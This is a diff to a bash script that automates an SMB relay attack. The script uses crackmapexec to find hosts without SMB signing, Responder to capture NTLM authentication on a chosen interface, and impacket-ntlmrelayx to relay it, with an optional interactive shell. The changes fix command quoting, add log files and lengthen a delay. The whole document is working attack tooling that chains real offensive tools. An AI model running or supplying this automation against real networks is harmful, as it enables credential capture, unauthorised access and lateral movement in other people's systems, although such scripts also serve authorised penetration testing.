@@ -8,8 +8,6 @@
 
 responder_config_file="/etc/responder/Responder.conf"
 session_name="smb_relay_attack"
-window1="responder"
-window2="ntlmrelayx"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 enable_interactive=false
 
@@ -68,7 +66,7 @@ validate_network_interface() {
 
 # Run crackmapexec
 run_crackmapexec() {
-    echo -e "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}"
+    echo -e "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}" | tee -a attack.log
     echo -e "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
     
     # Run crackmapexec and let it generate the relay list
@@ -131,7 +129,7 @@ run_smb_relay_attack() {
 
     # Start Responder in a tmux window
     echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
-    start_tmux_window "$session_name" "responder" "responder -I $network_interface" 2>&1 | tee -a responder_$(date +%s).log" || {
+    start_tmux_window "$session_name" "responder" "responder -I $network_interface 2>&1 | tee -a responder_$(date +%s).log" || {
         echo -e "${RED}Failed to start Responder.${RESET}"
         exit 1
     }
@@ -139,7 +137,7 @@ run_smb_relay_attack() {
     # Start ntlmrelayx in another tmux window
     echo -e "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
 
-    relay_command="impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" 2>&1 | tee -a relay_$(date +%s).log"
+    relay_command="impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE} 2>&1 | tee -a relay_$(date +%s).log"
     if [ "$enable_interactive" = true ]; then
         echo -e "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
         relay_command+=" --interactive"
@@ -235,7 +233,7 @@ run_crackmapexec
 if [ -s "${TARGET_SMB_FILE}" ]; then
     echo -e "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
     edit_responder_conf
-    sleep 2
+    sleep 5
     run_smb_relay_attack
 else
     echo -e "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
